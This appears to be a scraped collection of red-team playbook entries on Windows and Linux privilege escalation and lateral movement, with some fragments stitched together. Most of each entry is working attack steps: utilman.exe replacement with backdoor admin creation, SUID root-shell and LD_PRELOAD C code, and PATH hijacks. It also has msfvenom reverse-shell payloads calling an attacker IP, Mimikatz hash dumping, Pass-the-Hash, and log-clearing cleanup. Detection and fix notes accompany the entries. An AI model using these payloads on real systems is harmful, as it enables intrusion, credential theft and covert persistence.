- **Tags**: #PrivilegeEscalation #CronExploit #LinuxMisconfig #RedTeam #cron.d #WorldWritable #ScheduledTask #T1053 #Persistence #RootShell

- **Attack Steps**: ### 🟢 STEP 1: Prepare a Bootable USBUse Kali Linux, Hiren’s Boot CD, or Windows PE to create a live USB using Rufus.Boot from this USB on the target system.---### 🟢 STEP 2: Mount the Windows DriveList partitions:lsblk or fdisk -lMount primary Windows partition:mount /dev/sda1 /mntNavigate:cd /mnt/Windows/System32---### 🟢 STEP 3: Backup Original utilman.exemv utilman.exe utilman_backup.exe---### 🟢 STEP 4: Copy cmd.exe to utilman.execp cmd.exe utilman.exe✅ Now, launching Utility Manager will launch a SYSTEM cmd prompt.---### 🟢 STEP 5: Reboot and Trigger ExploitReboot the machine normally.At login screen, press Windows + U OR click the Ease of Access icon.✅ This opens a SYSTEM-level cmd.exe shell.Now you can:• Create a new user:net user admin123 MyPass123 /addnet localgroup administrators admin123 /add• Reset an existing user's password:net user victimuser newpass123• Enable RDP:reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f---### 🛑 STEP 6: Restore Original Files (Post-Exploit Cleanup)Reboot into bootable USB again.Navigate to System32:• rm utilman.exe• mv utilman_backup.exe utilman.exe🧠 Tips:• This technique works across Windows 7/10/11 if secure boot protections are not enforced.• Useful for forensics students, red-team demos, or locked-out recovery.
- **Detection**: - Integrity monitoring on System32 binaries- Event log (ID 4688) for cmd.exe at login- Forensics for file modification timestamps
- **Solution**: - Disable Ease of Access tools on login screen- Use BitLocker for full disk encryption- Enable UEFI password- Restrict boot from USB / CD-ROM
- **Tags**: #utilman #EaseOfAccessHack #WindowsLPE #OfflineBypass #RedTeam #System32Exploit #cmd #AccessibilityBackdoor #DFIR

## Bypass via Live CD / Bootable USB

- **Attack Type**: Local Privilege Escalation (Offline Bypass)
- **Target**: Physical SystemsEnterprise LaptopsUnprotected PCs

From there, the attacker can reset local passwords, extract sensitive files (like SAM hashes), or replace system binaries (like cmd.exe, utilman.exe, sethc.exe). This is extremely effective where BitLocker or BIOS-level protections are not enforced.

- **Detection**: - Monitor boot logs- Look for unexpected password resets- Check registry audit trails- Use forensic analysis tools
- **Solution**: - Enforce BIOS password- Disable USB boot- Enable full disk encryption (BitLocker)- Monitor registry and login changes- Use tamper-proof endpoint controls
- **Tags**: #LiveUSB #OfflineBypass #PrivilegeEscalation #chntpw #utilmanExploit #USBBootHack #BitLockerBypass #RedTeam #OfflineAccess

Restore original sethc.exe:cmd<br>copy /y C:\Windows\System32\sethc.bak C:\Windows\System32\sethc.exe<br>2. Delete backdoor usercmd<br>net user hacker /del<br>

The attacker, starting as a limited user, finds these binaries using find or linpeas, and uses known abuse techniques from GTFOBins to escalate privileges by spawning a root shell (/bin/sh or /bin/bash). Very common in misconfigured or old Linux systems.

## Write Custom SUID C Shell Binary

- **Attack Type**: Local Privilege Escalation (Manual SUID)
- **Target**: Linux workstationsDev/test Linux VMsCI runners with SUID permission
- **Vulnerability**: Misconfigured dev environmentSUID binary creation without audit

- **Tools**: ✅ gcc compiler✅ Linux system with SUID bit support✅ /bin/bash or /bin/sh shell✅ Terminal (bash)✅ chmod, chown, id, whoami
- **Scenario**: This simulation demonstrates how an attacker or insider with write access to a directory or permission to execute a compiled binary with root ownership and SUID set, can compile a malicious C binary that spawns a shell (/bin/bash). Once executed, the attacker gains root shell access even from an unprivileged user. This simulates real misconfigurations where devs leave testing SUID binaries or attackers plant one. Common in weak hardened Linux systems.
- **Attack Steps**: ### 🟢 STEP 1: Create the C Source CodeCreate a file named rootshell.c:c<br>#include <stdlib.h><br>int main() {<br> setuid(0);<br> setgid(0);<br> system("/bin/bash");<br> return 0;<br>}<br>---### 🟢 STEP 2: Compile the C BinaryRun:bash<br>gcc rootshell.c -o rootshell<br>This produces a rootshell executable.---### 🟢 STEP 3: Set SUID and OwnershipRun as root:bash<br>chown root:root rootshell<br>chmod 4755 rootshell<br>ls -l rootshell<br>You should see: -rwsr-xr-x 1 root root ... rootshell✅ The s in place of x indicates SUID is set.---### 🟢 STEP 4: Execute the Binary as Unprivileged UserChange to unprivileged user or use su:bash<br>whoami # should be your regular user<br>./rootshell<br>✅ Check identity again:bash<br>whoami<br>id<br>✅ Output should be:rootuid=0(root) gid=0(root)🎯 You now have a root shell.---### 🛑 STEP 5: Cleanupbash<br>rm rootshell rootshell.c<br>✅ Always delete test payloads after lab or use encrypted VM snapshot restore.
- **Detection**: Scan for SUID files using find / -perm -4000 -type f -exec ls -la {} \; regularlyAudit new binaries in sensitive paths
- **Solution**: Remove unnecessary SUID permissionsUse AppArmor or SELinux to deny executionDisallow gcc in production environments
- **Tags**: #CustomSUID #RootShell #PrivilegeEscalation #LinuxLPE #RedTeam #CExploit #GTFOBins

## SUID Binary Allows Arbitrary Command Execution

- **Attack Type**: Local Privilege Escalation via SUID Misuse
- **Target**: Linux ServersDev WorkstationsLegacy Admin Tools

- **MITRE**: T1548.001 (Abuse Elevation Control Mechanism: SUID/SGID)
- **Impact**: Root shell access from local userUnauthorized system modification
- **Tools**: ✅ Linux VM (Kali or Ubuntu)✅ find, strings, ltrace, strace✅ Any exploitable SUID binary (vuln-bin)
- **Scenario**: This lab simulates how a user can gain root access by exploiting a vulnerable SUID binary that either improperly uses system(), or takes input without sanitization, allowing execution of arbitrary commands as root. These binaries are often overlooked in audits. This vulnerability is often found in homegrown admin scripts, legacy testing tools, or custom-built C programs left on production systems.
- **Attack Steps**: ### 🟢 STEP 1: Find SUID Binariesbash<br>find / -perm -4000 -type f 2>/dev/null<br>Look for binaries not part of standard Linux system:/usr/local/bin/vuln-bin---### 🟢 STEP 2: Analyze the BinaryUse strings or ltrace:bash<br>strings /usr/local/bin/vuln-bin<br>ltrace /usr/local/bin/vuln-bin<br>Look for signs of system() calls or commands like cp, cat, etc.---### 🟢 STEP 3: Run Binary and Check Input Behaviorbash<br>/usr/local/bin/vuln-bin<br>If it asks for a filename or command:Try injecting a shell:bash<br>; /bin/bash<br>Or pipe something like:bash<br>vuln-bin "$(bash -i)"<br>---### 🟢 STEP 4: Exploit Arbitrary Command ExecutionTry variations:bash<br>/usr/local/bin/vuln-bin "hello; id"<br>/usr/local/bin/vuln-bin "hello && whoami"<br>/usr/local/bin/vuln-bin "; /bin/bash"<br>✅ If vulnerable, you now have a root shell.Verify:bash<br>whoami<br>id<br>Expected Output:root, uid=0(root)---### 🛑 STEP 5: Cleanupbash<br>exit<br>clear<br>Always exit the shell and remove traces if done in a lab or ethical audit.🧠 Tip:Even hardcoded commands like cp $1 /root/ can be exploited by symlinks or fake binaries in the PATH.
- **Detection**: - Monitor for unusual SUID binaries- Use lsof, auditd, or AppArmor profiles- Check for strange user input passed to shell commands
- **Solution**: - Audit custom SUID binaries- Avoid using system() with user input- Remove SUID from unnecessary files- Use sudo with whitelist configuration instead

## LD_PRELOAD or LD_LIBRARY_PATH Injection

- **Attack Type**: Local Privilege Escalation via Shared Object Injection
- **Target**: Linux serversCustom admin toolsLegacy appsScripts and cron jobs
- **Vulnerability**: Unsafe use of LD_PRELOAD / LD_LIBRARY_PATHBinary does not sanitize environment variables
- **MITRE**: T1574.006 (Hijack Execution Flow: LD_PRELOAD)T1574.001 (DLL Search Order Hijacking)
- **Impact**: - Execute malicious code as root- Bypass intended restrictions- Full local privilege escalation
- **Tools**: ✅ Linux VM (Kali, Ubuntu)✅ GCC compiler✅ Text editor (nano, vim)✅ Any misconfigured binary or custom script
- **Scenario**: This simulation showcases how a local attacker can abuse environment variables like LD_PRELOAD or LD_LIBRARY_PATH to load a malicious shared object (.so) before the target binary loads its real library. If the binary is not protected (e.g., not setuid-root or lacks sanitization), attackers can escalate privileges or hijack execution, especially in scripts or misconfigured cron jobs.
- **Attack Steps**: ### 🟢 STEP 1: Understand LD_PRELOAD BasicsLD_PRELOAD forces a specified .so (shared object) to be loaded before system libraries.Example:bash<br>LD_PRELOAD=./malicious.so ls<br>This runs the ls command but first loads malicious.so.---### 🟢 STEP 2: Identify Vulnerable TargetTarget should:• Be dynamically linked (not statically)• Not strip or ignore environment varsCheck:bash<br>ldd /usr/bin/somebinary<br>If it shows linked libraries, it’s dynamic.Use strings, strace, or inspect shell scripts or cron jobs to find a target using relative or unsafe library paths.---### 🟢 STEP 3: Create Malicious Shared LibraryWrite a .c file that hijacks a function:c<br>#include <stdio.h><br>void __attribute__((constructor)) init() {<br> setuid(0); setgid(0);<br> system("/bin/bash");<br>}<br>Compile it:bash<br>gcc -fPIC -shared -o malicious.so malicious.c<br>---### 🟢 STEP 4: Trigger the Vulnerable BinaryIf binary does not strip LD_PRELOAD, run:bash<br>LD_PRELOAD=./malicious.so /path/to/vuln-bin<br>You should now have a root shell if binary is setuid.✅ Confirm:bash<br>id<br>whoami<br>If you see uid=0(root), it worked.---### 🛑 STEP 5: Cleanupbash<br>exit<br>rm malicious.so<br>history -c<br>🧠 Tip:• This also works with LD_LIBRARY_PATH if you create a directory with a fake .so name like libc.so.6 and preload it before execution.
- **Detection**: - Monitor use of LD_PRELOAD- Detect shared object injection with auditd, ps, or custom watchdogs
- **Solution**: - Strip SUID binaries of environment vars (secure_exec)- Use static linking for critical tools- Do not run SUID-root scripts that respect LD_PRELOAD
- **Tags**: #LDPreloadHack #LinuxLPE #PrivilegeEscalation #SOInjection #HijackLibrary #RedTeam #RootHack #PentestLab

## PATH Variable Manipulation (Unsafe System Calls)

- **Attack Type**: Local Privilege Escalation via PATH Hijack
- **Target**: Linux systemsRoot cron jobsBackup scriptsAdmin tools
- **Vulnerability**: Unquoted/unqualified system calls in privileged scriptAttacker-controlled PATH
- **MITRE**: T1574.007 (Hijack Execution Flow: Path Interception by PATH Variable)
- **Impact**: - Execute arbitrary code as root- Persistent privilege escalation- Lateral movement
- **Tools**: ✅ Kali Linux or Ubuntu VM✅ Text editor (nano/vim)✅ GCC compiler (optional)✅ A vulnerable root script
- **Scenario**: This simulation explores how an attacker can exploit a poorly written script or binary that uses relative system calls (e.g., system("cp file /tmp/")) without full paths. If the script runs with elevated privileges and the attacker can manipulate $PATH, they can replace the called command (e.g., cp) with a malicious version that spawns a root shell. This is a common misconfiguration in custom scripts and backup utilities.
- **Attack Steps**: ### 🟢 STEP 1: Identify Vulnerable Script or BinaryLook for a file that:• Runs with sudo, cron, or SUID• Uses system() or shell commands without full pathsExample vulnerable code:bash<br>#!/bin/bash<br>cp /etc/passwd /tmp/passwd.bak<br>✅ Vulnerable because it uses cp without absolute path.---### 🟢 STEP 2: Create Malicious ScriptInside /tmp, create a fake cp command:bash<br>echo -e '#!/bin/bash\n/bin/bash' > /tmp/cp<br>chmod +x /tmp/cp<br>This will drop to a shell.---### 🟢 STEP 3: Hijack the PATHTemporarily change the path to include /tmp before default:bash<br>export PATH=/tmp:$PATH<br>Now when cp is called, your malicious script runs.---### 🟢 STEP 4: Execute the Vulnerable Scriptbash<br>sudo /path/to/vuln-script.sh<br>You should get a root shell if the script ran as root.✅ Confirm with:bash<br>whoami<br>id<br>---### 🛑 STEP 5: Cleanupbash<br>rm /tmp/cp<br>unset PATH<br>exit<br>🧠 Pro Tip: Always test with a safe binary before targeting real services.
- **Detection**: - Use auditd to log execs- Check sudo scripts and cron jobs for unqualified calls
- **Solution**: - Always use absolute paths in privileged scripts (e.g., /bin/cp)- Sanitize environment vars- Avoid system() where possible
- **Tags**: #PATHHijack #ShellInjection #ScriptExploit #RootEscalation #RedTeam #PrivilegeEscalation #LinuxPentest

- **Attack Steps**: 🔹STEP 1: Identify Custom SUID Binary• Run: find / -perm -4000 -type f 2>/dev/null• Locate the target, e.g., /opt/vuln/bof_suid🔹STEP 2: Inspect the Binary• Use file /opt/vuln/bof_suid → ELF 64-bit• Check strings: strings /opt/vuln/bof_suid• Use ltrace or gdb for analysis🔹STEP 3: Confirm Vulnerability• Try long input: ./bof_suid $(python3 -c 'print("A"*200)')• If segmentation fault occurs → vulnerable• Use gdb:→ gdb ./bof_suid→ run $(python3 -c 'print("A"*100)')→ Identify offset using cyclic pattern: msf-pattern_create -l 200🔹STEP 4: Overwrite Return Address (Exploit)• Calculate EIP offset: msf-pattern_offset -l 200 -q <EIP>• Build payload:bash<br>python3 -c 'print("A"*offset + "B"*4 + "\xef\xbe\xad\xde")' # Overwrite return addr<br>• Or spawn shell:c<br>system("/bin/sh") // use ROP or shellcode<br>• Make sure ASLR is off (for testing):echo 0 > /proc/sys/kernel/randomize_va_space🔹STEP 5: Gain Root Shell• If exploit works, shell appears as root• Confirm: whoami → root• Success = Privilege Escalation🔹STEP 6: Cleanup• Remove generated shell files (e.g., a.out, exploit.py)• Document offset and binary behavior🔹**[Optional] Vulnerable Binary Code for Practice**c<br>#include <stdio.h><br>#include <string.h><br>int main(int argc, char *argv[]) {<br> char buf[64];<br> if (argc > 1) strcpy(buf, argv[1]);<br> printf("Input received\\n");<br> return 0;<br>}<br>• Compile: gcc vuln.c -o bof_suid -fno-stack-protector -z execstack• Make SUID: chmod u+s bof_suid && chown root bof_suid
- **Detection**: • Use auditd to monitor SUID execs• Use gdb core dumps• Monitor /var/log/syslog for segfaults
- **Solution**: • Avoid SUID binaries unless essential• Use secure functions (fgets, snprintf)• Enable stack protection, ASLR, PIE• Regularly audit SUID files (find / -perm -4000)
- **Tags**: #SUID #BufferOverflow #PrivilegeEscalation #GTFOBins #BinaryExploit #LocalRoot

## Drop Malicious EXE at C:\Program.exe

- **Attack Type**: Path Hijacking / File Execution Hijack
- **Target**: Windows servicesScheduled tasksOld enterprise software
- **Vulnerability**: Unquoted service path with spacesWritable C:\ drive for low-priv user
- **MITRE**: T1574.009 (Hijack Execution Flow: Path Interception)
- **Impact**: Full SYSTEM-level code executionReverse shellPersistence setup
- **Tools**: ✅ Windows 10 VM✅ CMD or PowerShell✅ Metasploit (optional)✅ accesschk.exe from Sysinternals✅ Service list viewer (services.msc)
- **Scenario**: When Windows services or scheduled tasks use unquoted paths with spaces (e.g., "C:\Program Files\Example Service\service.exe"), Windows will look for the first matching executable in the split path (e.g., C:\Program.exe, C:\Program Files\Example.exe). An attacker with low privilege and write access to C:\ can drop a malicious executable named Program.exe, which runs with SYSTEM privileges when the service starts. Common on misconfigured Windows systems.
- **Attack Steps**: ### 🔹 STEP 1: Find Vulnerable Service• Run: wmic service get name,displayname,pathname,startmode• Look for unquoted paths with spaces:Example: "C:\Program Files\Vulnerable Service\svc.exe"• Confirm if StartMode is Auto or Manual### 🔹 STEP 2: Check Write Access• Use Sysinternals:accesschk.exe -uwd "Users" C:\• If "WRITE" or "FILE_ADD_FILE" on C:\, you're vulnerable.### 🔹 STEP 3: Create Malicious Payload• Generate payload:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o Program.exe• Or simply: a messagebox or UAC bypass payload### 🔹 STEP 4: Drop Executable• Copy to root:move Program.exe C:\Program.exe### 🔹 STEP 5: Restart the Vulnerable Service• From low-priv user:net stop "Vulnerable Service"net start "Vulnerable Service"→ SYSTEM service starts and launches C:\Program.exe### 🔹 STEP 6: Catch Shell (if used Metasploit payload)• Start handler:msfconsoleuse exploit/multi/handlerset PAYLOAD windows/x64/shell_reverse_tcpset LHOST <your_ip>set LPORT 4444run### 🔹 STEP 7: Post-Exploitation• Run whoami → returns nt authority\system• Cleanup:– Delete C:\Program.exe– Log events for forensic analysis🧠 Tips:• This attack doesn’t require admin access—just write permissions to root• Many old enterprise systems still vulnerable• Check via: sc qc "<service>" for unquoted path
- **Detection**: - Event logs: 7045 (Service install), 4697 (Service start)- Use Sysmon to monitor unexpected EXE in C:\
- **Solution**: - Always quote paths in Windows service configs- Remove write permissions from C:\ for Users- Use GPO to enforce restricted paths
- **Tags**: #PathHijack #ProgramDotExe #WindowsPrivilegeEscalation #UnquotedPath #CVEStyle #GTFOBins #SystemShell

## Drop Malicious EXE at C:\Program Files\Some.exe

- **Attack Type**: Path Hijacking via Intermediate Executable
- **Target**: Windows servicesAuto-start appsLegacy software installs
- **Vulnerability**: Unquoted service pathWritable intermediate directoryImproper file hierarchy configuration
- **MITRE**: T1574.009 (Hijack Execution Flow – Path Interception)
- **Impact**: SYSTEM-level code executionReverse shell or backdoorPersistence installation
- **Tools**: ✅ Windows VM✅ accesschk.exe (Sysinternals)✅ wmic or sc.exe✅ msfvenom (optional)✅ PowerShell or CMD✅ Basic permissions
- **Scenario**: Similar to the C:\Program.exe attack, this technique targets unquoted Windows service paths with intermediate folders having spaces. If a service is configured like "C:\Program Files\Some Folder\AppService.exe" and the attacker has write access to C:\Program Files\, they can drop a malicious file like Some.exe. When the system attempts to start the service, it may launch Some.exe instead of the correct binary due to how Windows handles path parsing. This results in SYSTEM-level execution of the attacker's EXE.
- **Attack Steps**: 🔹 STEP 1: Identify Unquoted Service Path Vulnerability• Run: wmic service get name,pathname,startmode• Look for services with unquoted paths and multiple directories with spaces.✅ Example:PathName: C:\Program Files\Some Folder\AppService.exe🔹 STEP 2: Analyze Path ResolutionWindows will try:1. C:\Program.exe2. C:\Program Files\Some.exe ← you exploit this3. C:\Program Files\Some Folder\AppService.exe🔹 STEP 3: Check Write Access• accesschk.exe -uwd "Users" "C:\Program Files"• If write access is possible → vulnerable🔹 STEP 4: Craft Malicious Executable• Use msfvenom:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o Some.exe• Or use a simple EXE that writes a file or spawns cmd.exe🔹 STEP 5: Drop Payloadcopy Some.exe "C:\Program Files\Some.exe"🔹 STEP 6: Restart the Vulnerable Service• As a low-privileged user:net stop "<Service Name>"net start "<Service Name>"• If path parsing fails → Some.exe is executed with SYSTEM privilege🔹 STEP 7: Capture or Verify Shell• If using reverse shell:msfconsole → run handler on windows/x64/shell_reverse_tcp• If basic command shell:Check for new files, cmd windows, event logs🔹 STEP 8: Cleanup• Delete C:\Program Files\Some.exe• Log the event, check audit logs🧠 Notes:• This attack relies on Windows path resolution flaws• Works without admin rights if write access exists• Common on legacy systems and poor group policy setups
- **Detection**: • Use Sysinternals Process Monitor (procmon)• Enable auditing on folder/EXE creation• Monitor service binary paths regularly
- **Solution**: • Always quote service paths• Prevent write access to C:\Program Files\ for non-admins• Enforce folder ACLs via GPO• Regular audit via wmic/sc qc
- **Tags**: #UnquotedPath #ProgramFiles #WindowsEscalation #PathHijack #RedTeam #GTFOBins #SomeDotExe #Persistence

## Writable Directory Within Path

- **Attack Type**: Path Hijacking via Writable Directory
- **Target**: Windows systemsLegacy softwareCustom apps/scripts
- **Vulnerability**: Writable PATH directoryCommand execution without full binary pathNo integrity checking
- **MITRE**: T1574.009 (Hijack Execution Flow – Path Interception)
- **Impact**: Full SYSTEM privilegeReverse shell or local adminCode execution during service/scheduled task/script runs
- **Tools**: ✅ Windows VM (Win7/10)✅ whoami, set, echo, accesschk✅ CMD or PowerShell✅ Optional: msfvenom, procmon
- **Scenario**: In this technique, attackers exploit a writable directory that appears in the system %PATH% environment variable. When a privileged process or user runs a command without specifying a full path, Windows will search each directory in %PATH% for that binary. If a lower-privileged user can drop a malicious EXE (e.g., net.exe, whoami.exe) in one of these writable directories, and the process prioritizes it, the attacker’s binary is executed with higher privileges (e.g., SYSTEM).
- **Attack Steps**: 🔹 STEP 1: View System PATH• Open cmd prompt:echo %PATH%• Look for directories like C:\Tools\, C:\Temp\, etc.🔹 STEP 2: Check Permissions• Use Sysinternals:accesschk.exe -uwd "Users" C:\Tools• Or right-click folder → Properties → Security → Users: "Modify" or "Write"🔹 STEP 3: Identify Vulnerable Executable Names• Review common commands executed by privileged scripts/services:whoami, hostname, net, tasklist• Also check scheduled tasks, login scripts, or service configs🔹 STEP 4: Create Malicious Payload• Build malicious whoami.exe that runs cmd.exe or creates a reverse shellExample:msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe -o whoami.exe🔹 STEP 5: Drop Payload in Writable PATH Directorycopy whoami.exe C:\Tools\whoami.exe🔹 STEP 6: Trigger Execution• Wait for service/script that calls whoami (or trigger manually if allowed)• Or create scheduled task using SYSTEM that runs without full path:cmd<br>schtasks /Create /SC ONCE /TN "Pwn" /TR "whoami" /ST 12:00 /RU SYSTEM<br>→ If successful, C:\Tools\whoami.exe runs as SYSTEM🔹 STEP 7: Gain Shell / Proof• If reverse shell used: catch on Metasploit• If interactive shell: whoami should show nt authority\system🔹 STEP 8: Cleanup• Delete whoami.exe or other dropped binaries• Check event logs for trace• Restore integrity of affected PATH folders🧠 Tips:• Works even with UAC if elevated process uses unquoted/bare command names• PATH order matters: first match wins• This attack is stealthier than dropping to C:\Program.exe
- **Detection**: • Enable audit logging• Monitor %PATH% environment• Use Sysmon or EDR to detect rogue binaries• Review folder-level permissions regularly
- **Solution**: • Never include user-writable directories in %PATH%• Use full paths in scripts and configs• Lock down folder ACLs in %PATH%• Use AppLocker or allowlists
- **Tags**: #WritablePath #WindowsEscalation #PathHijack #EnvironmentAttack #PrivilegeEscalation #GTFOBins #OSExploit

## Path Injection via Space in Custom Service Paths

- **Attack Type**: Path Hijacking via Unquoted Service Path with Space
- **Target**: Windows servicesCustom softwareLegacy deployments
- **Vulnerability**: Unquoted service path with intermediate spaceNo input validationWritable intermediate directory
- **MITRE**: T1574.009 (Hijack Execution Flow – Path Interception)
- **Impact**: Full SYSTEM-level code executionReverse shellPersistence backdoor
- **Tools**: ✅ Windows VM✅ CMD or PowerShell✅ accesschk.exe (Sysinternals)✅ sc.exe or wmic✅ msfvenom (optional)✅ Optional: Procmon, Autoruns
- **Scenario**: This attack abuses custom Windows services registered with unquoted executable paths containing spaces (e.g., "C:\Apps\My Service\App.exe"). When the service starts, Windows attempts to parse the path incorrectly and may execute a malicious binary placed at an intermediate path, such as C:\Apps\My.exe. This allows a low-privileged attacker with write access to the directory to escalate privileges to SYSTEM, as the service is executed under elevated context.
- **Attack Steps**: 🔹 STEP 1: Identify Vulnerable Service• Run: wmic service get name,displayname,pathname,startmode• Or use: sc qc "<ServiceName>"• Find services with unquoted paths that include spaces.✅ Example:PathName : C:\Apps\My Service\App.exe🔹 STEP 2: Understand Injection PointsWindows parses the above path like:1. C:\Apps\My.exe ← Executed if present2. C:\Apps\My Service\App.exe🔹 STEP 3: Check Directory Permissions• Run:accesschk.exe -uwd "Users" C:\Apps• If "WRITE" or "FILE_ADD_FILE" is present → vulnerable🔹 STEP 4: Build Malicious EXE• Use:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o My.exe• OR make a simple cmd.exe launcher🔹 STEP 5: Drop Payload in Injected Pathmove My.exe C:\Apps\My.exe🔹 STEP 6: Restart the Vulnerable Servicenet stop "<Service Name>"net start "<Service Name>"• My.exe is executed with SYSTEM privileges instead of real service binary🔹 STEP 7: Confirm Execution• If reverse shell: launch handler in Metasploit• If test EXE: check if launched with whoami = nt authority\system🔹 STEP 8: Cleanup• Delete C:\Apps\My.exe• Reconfigure the service with quotes:sc config "<Service Name>" binPath= "\"C:\Apps\My Service\App.exe\""🧠 Tips:• Works even when the real binary is valid• Most common in custom or legacy services• This differs from C:\Program.exe attack — focuses on deep paths with multiple words• Test safely in isolated VMs
- **Detection**: • Monitor service execution paths• Sysmon/Procmon for unusual binary execution• Check for unexpected EXEs in common app folders
- **Solution**: • Always quote binary paths in Windows services• Lock directory permissions where services are installed• Regular audit using wmic, sc, accesschk, GPO• Use AppLocker / Defender Application Control
- **Tags**: #UnquotedServicePath #WindowsPrivEsc #CustomServiceHack #PathInjection #GTFOBins #Escalation #RedTeam #SysmonDetection #Backdoor

## Remote PowerShell Execution via Evil-WinRM

- **Attack Type**: Remote Code Execution over WinRM (PowerShell)
- **Target**: Domain-joined Windows hostsRemote serversAdmin desktops
- **Vulnerability**: Misconfigured or exposed WinRM serviceValid credentialsWeak endpoint protection
- **MITRE**: T1021.006 (Remote Services: Windows Remote Management)
- **Impact**: Remote PowerShell accessCode execution as SYSTEMDomain persistenceLateral movement
- **Tools**: ✅ Kali Linux or Parrot OS✅ Evil-WinRM✅ Valid Windows credentials✅ Metasploit (optional)✅ netcat, mimikatz, PowerView, SharpHound (optional)
- **Scenario**: This attack demonstrates how an attacker with valid credentials (typically obtained via credential dumping or phishing) can use Evil-WinRM, a post-exploitation tool, to gain a remote PowerShell session on a Windows machine. It abuses Windows Remote Management (WinRM), which is often enabled on domain-joined machines for administrative purposes. If WinRM is exposed and a local or domain admin account is known, attackers can achieve remote SYSTEM-level code execution.
- **Attack Steps**: 🔹 STEP 1: Confirm WinRM Is Enabled on Target• Use nmap to scan target for WinRM port (5985 for HTTP, 5986 for HTTPS)bash<br>nmap -p 5985,5986 <target-ip><br>✅ If 5985 is open, proceed🔹 STEP 2: Gather Credentials (Assumed You Have Them)• For lab: create a low-priv or domain user:net user pentest P@ssw0rd /addnet localgroup administrators pentest /add🔹 STEP 3: Connect Using Evil-WinRM• Install (if needed):gem install evil-winrm• Connect:bash<br>evil-winrm -i <target-ip> -u <username> -p <password><br>✅ You’ll get an interactive PowerShell session🔹 STEP 4: Perform ReconnaissanceInside Evil-WinRM shell, run:whoamihostnameipconfig /allnet usersnet localgroup administratorsGet-ChildItem -Recurse C:\Users🔹 STEP 5: Drop and Execute Payloads (Optional)• Upload:upload payload.exe• Run:./payload.exe✅ You can also run PowerShell scripts directly:Invoke-Mimikatz.ps1, PowerView.ps1, or run commands like:Invoke-Command -ScriptBlock { Add-LocalGroupMember -Group "Administrators" -Member "attacker" }🔹 STEP 6: Pivot or Dump Hashes• Use mimikatz to dump creds• Or use Invoke-BloodHound for AD recon🔹 STEP 7: Maintain Access• Add new admin user• Modify registry for persistence• Set up startup script🔹 STEP 8: Cleanup (if needed)• Remove dropped files• Remove attacker account• Clear logs (use wevtutil cl <logname>)🧠 Tips:• Evil-WinRM supports file upload, download, PS scripts, and even CredSSP• Combine with tools like SharpRDP, Empire, or Covenant for post-exploitation• Works best when WinRM is misconfigured or wide open to LAN/WAN💡 This is a powerful post-exploitation method used in Red Teaming and lateral movement. Use strictly in labs or with permission.
- **Detection**: - Monitor for Evil-WinRM usage- Analyze logs for 5985/5986 activity- Review remote PowerShell audit events (event IDs 4100–4104)- Use EDRs to flag unusual scripts
- **Solution**: - Disable WinRM where not needed- Use strong auth (Kerberos, 2FA)- Use Just Enough Admin (JEA)- Monitor and restrict lateral movement- Apply PowerShell logging and constrained language mode
- **Tags**: #EvilWinRM #WinRMAbuse #RemoteShell #RedTeam #PowerShell #DomainLateralMovement #GTFOBins #PostExploitation

## Lateral Movement Using Stolen Hashes (Pass-the-Hash)

- **Attack Type**: Credential Abuse / Network Pivoting
- **Target**: Domain-joined Windows MachinesServersAdmin Workstations
- **Vulnerability**: NTLM authentication enabledPrivilege reuseWeak hash protection (no LSA hardening)
- **MITRE**: T1550.002 (Use Alternate Auth Material: Pass-the-Hash)
- **Impact**: Lateral movementAdmin shellFull network takeoverRemote code execution
- **Tools**: ✅ Kali Linux or Parrot OS✅ Windows VM (Victim)✅ Mimikatz✅ pth-winexe / impacket-psexec / wmiexec.py✅ Metasploit Framework (optional)✅ BloodHound (optional)
- **Scenario**: This simulation showcases how attackers can perform lateral movement inside a Windows Active Directory network using NTLM password hashes instead of plaintext passwords. This is known as Pass-the-Hash (PtH). If the attacker compromises a system and dumps password hashes using tools like Mimikatz, they can use those hashes to access other systems that accept NTLM authentication, effectively bypassing the need for passwords.
- **Attack Steps**: 🔹 STEP 1: Setup the Lab• Windows Domain Controller (DC01) and a few domain-joined machines (PC1, PC2)• Kali Linux or Parrot OS attacker machine on the same subnet🔹 STEP 2: Dump NTLM Hashes with Mimikatz• On a compromised Windows host:Run PowerShell as admin:Invoke-Mimikatz -Command '"privilege::debug" "lsadump::sam"'• Or interactively:mimikatz.exeprivilege::debugsekurlsa::logonpasswords✅ Note down Administrator’s NTLM hash:aad3b435b51404eeaad3b435b51404ee:cc36cf7a8514893efccd332446158b1a🔹 STEP 3: Use Impacket or WinExe with the HashFrom Kali:bash<br>impacket-psexec administrator@192.168.56.102 -hashes aad3b435b51404eeaad3b435b51404ee:cc36cf7a8514893efccd332446158b1a<br>✅ If hash is valid and admin rights are present, you'll get SYSTEM shell🔹 STEP 4: Execute Commands Remotely• Example: dump SAM from remote machinereg save HKLM\SAM C:\Temp\sam.save🔹 STEP 5: Pivot Further• Use BloodHound or PowerView to find next hops• Repeat PtH using dumped hashes🔹 STEP 6: Use pth-winexe Alternative (Linux)bash<br>pth-winexe -U 'Administrator%HASH' //192.168.56.103 cmd.exe<br>🔹 STEP 7: Maintain Access or Persist• Add a user to domain group:net user backdoor P@ss123 /addnet localgroup administrators backdoor /add🔹 STEP 8: Cleanup• Clear logs• Remove added users• Remove dumped hash files🧠 Tips:• Works only if target allows NTLM auth (disable via GPO to prevent)• Domain Admin hashes can move anywhere!• Can be combined with token impersonation and golden ticket attacks• Works best after successful privilege escalation💡 This method is widely used in red teaming and real-world breaches, especially against misconfigured Windows domains.
- **Detection**: - Monitor logon events- Detect NTLM login attempts across hosts- Use EDR to flag tools like Mimikatz- SIEM with lateral auth pattern rules
- **Solution**: - Disable NTLM where possible- Use LSA protection- Implement tiered admin accounts- Audit logins and sessions- Apply credential guard and EDR solutions
- **Tags**: #PassTheHash #NTLM #Mimikatz #WindowsLateralMovement #RedTeam #CredentialTheft #PrivilegeEscalation #Impacket

## Remote Execution with PowerShell Remoting (Built-In)

- **Attack Type**: Legitimate Feature Abuse / Remote Code Execution
- **Target**: Domain-joined Windows endpoints
- **Vulnerability**: Overexposed WinRMDefault config allows domain authUnrestricted access to remote execution
- **MITRE**: T1021.006 (Remote Services: PowerShell Remoting)
- **Impact**: Remote code executionFileless payload deliveryLateral movement across network
